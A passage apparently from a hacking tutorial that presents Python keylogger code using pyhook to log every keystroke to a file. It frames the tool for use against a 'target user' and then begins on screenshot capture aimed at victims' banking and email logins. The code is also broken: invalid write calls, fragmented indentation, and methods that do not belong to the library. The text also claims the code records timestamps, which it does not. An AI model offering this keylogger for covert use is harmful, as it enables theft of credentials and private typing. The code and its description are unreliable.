```
import pyhook

#change this to your log file’s path
log_file = '/home/aman/Desktop/file.log'
```

```
#this function is called every time a key is pressed
def OnKeyPress(event):
    fob = open(log_file, 'a')
    fob.write(event,'\n')
    fob.writer('\n')
```

```
if event.ASCII==96: #96 is the ascii value of the grave key
    fob.close()
    new_hook.cancel()

#instantiate HookManager class
new_hook=pyhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
```

This is just a basic code that you will be able to use in order to create the keylogger that you want to get things done. You can always add on more or take off parts based on what you would like to see happen within the program, but this one is going to help you to keep track of the keystrokes that are going on, keeps them in a method that you are able to read rather than doing one character at a time, and helps you to see what time everything is being typed out for your own use.

# Getting Screenshots

Now the keylogger can be a really powerful tool when you are working with hacking, but it can only go far. For example, if the target user is clicking on a link to get to their banking, email, or another place rather than typing in the URL online, how are you